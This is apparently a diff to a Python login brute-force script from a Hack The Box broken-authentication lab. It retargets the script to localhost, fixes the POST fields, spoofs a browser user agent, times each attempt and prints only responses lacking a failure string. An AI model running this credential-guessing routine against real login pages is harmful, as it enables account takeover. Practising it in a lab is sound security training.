@@ -3,7 +3,7 @@ import requests
 import os.path
 
 # define target TARGET_URL, change as needed
-TARGET_URL = "http://brokenauthentication.hackthebox.eu/login.php"
+TARGET_URL = "http://127.0.0.1:5000"
 
 # define a fake HEADERS to present ourself as Chromium browser, change if needed
 HEADERS = {
@@ -32,8 +32,8 @@ def unpack(fline):
 our PHP example accepts requests via POST, and requires parameters as userid and passwd
 """
 def do_req(TARGET_URL, userid, passwd, HEADERS):
-  data = {"userid": userid, "passwd": passwd, "submit": "submit"}
-  res = requests.post(TARGET_URL, HEADERS=HEADERS, data=data)
+  data = {"username": userid, "password": passwd}
+  res = requests.post(url=TARGET_URL, headers=HEADERS, data=data)
   print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))
 
   return res.text
@@ -62,8 +62,8 @@ def main():
       res = do_req(TARGET_URL, userid, passwd, HEADERS)
       
       # Process the response
-      print(type(res))
-      print(res)
+      if res.find(FAILURE_STRING) == -1:
+        print(res)
 
 if __name__ == "__main__":
   main()
